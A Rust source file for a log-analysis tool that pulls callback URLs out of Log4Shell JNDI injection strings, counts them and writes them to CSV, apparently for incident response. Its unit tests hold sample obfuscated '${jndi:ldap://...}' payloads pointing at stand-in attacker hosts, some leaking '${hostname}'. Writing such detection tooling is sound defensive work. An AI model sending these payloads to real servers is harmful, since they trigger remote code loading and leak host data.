use csv::Writer;
use std::collections::HashMap;
use std::error::Error;

pub struct Extractor {
    is_extractable: bool,
    urls: HashMap<String, u64>,
}

impl Extractor {
    pub fn new(is_extractable: bool) -> Self {
        Self {
            urls: HashMap::new(),
            is_extractable,
        }
    }

    pub fn extract_urls(&mut self, line: &str) {
        if !self.is_extractable {
            return;
        }

        let mut payloads = line;

        while let Some((start, end)) = parse_url(payloads) {
            *self
                .urls
                .entry(payloads[start..end].to_string())
                .or_insert(0) += 1;

            payloads = &payloads[end..];
        }
    }

    pub fn extract_to_csv(&self, output_path: Option<&str>) -> Result<(), Box<dyn Error>> {
        if self.urls.is_empty() {
            return Ok(());
        }

        let output_path = output_path.unwrap();
        let mut writer = Writer::from_path(output_path)?;

        for (domain, count) in self.urls.iter() {
            writer.write_record(&[domain, &count.to_string()])?;
        }

        writer.flush()?;
        Ok(())
    }
}

fn parse_url(line: &str) -> Option<(usize, usize)> {
    let mut search_index = line.find("//")? + 2;
    let mut offset: usize = search_index;
    let mut find_http = line.find("http://").unwrap_or(usize::MAX);
    let mut find_https = line.find("https://").unwrap_or(usize::MAX);

    while find_http < search_index || find_https < search_index {
        search_index = line[offset..].find("//")? + 2;
        find_http = line[offset..].find("http://").unwrap_or(usize::MAX);
        find_https = line[offset..].find("https://").unwrap_or(usize::MAX);
        offset += search_index;
    }

    let domain = line[offset..].chars();
    let mut brackets = 1;

    for (pos, letter) in domain.enumerate() {
        match (letter, brackets) {
            ('}', 1) => return Some((offset, offset + pos)),
            ('=', _) => return Some((offset, offset + pos)),
            ('{', _) => brackets += 1,
            ('}', _) => brackets -= 1,
            _ => continue,
        }
    }

    None
}

#[cfg(test)]
mod tests {
    use super::Extractor;

    #[test]
    fn extracts_single_domain_in_line() {
        let mut extractor = Extractor::new(true);
        extractor.extract_urls("https://mywebsite.com/?x=${jndi:ldap://${hostname}.c6340b92vtc00002.interactsh.com/path/a}");
        assert!(extractor
            .urls
            .contains_key("${hostname}.c6340b92vtc00002.interactsh.com/path/a"));
    }

    #[test]
    fn extracts_multiple_urls_in_line() {
        let mut extractor = Extractor::new(true);
        extractor.extract_urls("${jndi:ldap://evilsite.com/z}${jndi:ldap://mywebsite.com/z}");

        assert!(extractor.urls.contains_key("evilsite.com/z"));
        assert!(extractor.urls.contains_key("mywebsite.com/z"));
    }

    #[test]
    fn extracts_multiple_urls_in_json_line() {
        let mut extractor = Extractor::new(true);
        extractor.extract_urls("{\"result\":{\"_raw\":\"{\"level\":\"info\",\"msg\":\"completed\",\"request_method\":\"get\",\"request_user_agent\":\"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostname}.tricky.com/a}\",\"request_referer\":\"${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostname}.complex.dev/z}\",\"referer\":\"${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://foo.wat.ca/a}\"}}");

        assert!(extractor.urls.contains_key("${hostname}.tricky.com/a"));
        assert!(extractor.urls.contains_key("${hostname}.complex.dev/z"));
        assert!(extractor.urls.contains_key("foo.wat.ca/a"));
    }

    #[test]
    fn increments_count_for_repeated_urls() {
        let mut extractor = Extractor::new(true);
        extractor.extract_urls("{\"result\":{\"_raw\":\"{\"level\":\"info\",\"msg\":\"completed\",\"request_method\":\"get\",\"request_user_agent\":\"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostname}.tricky.com/a}\",\"request_referer\":\"${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://foo.wat.ca/a}\",\"referer\":\"${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://foo.wat.ca/a}\"}}");

        assert!(extractor.urls.contains_key("${hostname}.tricky.com/a"));
        assert_eq!(Some(&1), extractor.urls.get("${hostname}.tricky.com/a"));
        assert!(extractor.urls.contains_key("foo.wat.ca/a"));
        assert_eq!(Some(&2), extractor.urls.get("foo.wat.ca/a"));
    }
}
